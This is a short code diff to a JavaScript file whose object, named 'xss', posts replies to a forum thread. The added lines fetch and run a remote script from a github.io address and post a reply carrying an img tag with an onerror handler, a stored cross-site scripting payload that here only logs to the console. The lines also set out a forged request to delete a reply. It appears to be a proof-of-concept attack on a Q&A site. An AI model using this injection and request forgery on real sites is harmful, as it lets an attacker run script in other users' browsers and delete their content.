@@ -5,7 +5,7 @@ function xss(content) {
 		'tiezi_id': '580'
 	},
 	this.callback = function (data) {
-		console.log(JSON.parse(data));
+		console.log(data);
 	}
 }
 xss.prototype = {
@@ -30,3 +30,28 @@ xss.prototype = {
 	}
 }
 var x = new xss;
+
+
+(function() {
+$.getScript("http://lcygithub.github.io/projects/wendaxss.js", function() {
+
+var content = '\
+学习了<img src="1" onerror="console.log(/error/)" alt="" />\
+'
+
+var x = new xss(content);
+x.post();
+});
+})()
+
+
+data = {
+	"c": "ajax",
+	"a": "delReply",
+	"id": "609",
+	"tid": "580"
+}
+
+url = "/?c=ajax&a=delReply&id=609&tid=580"
+
+
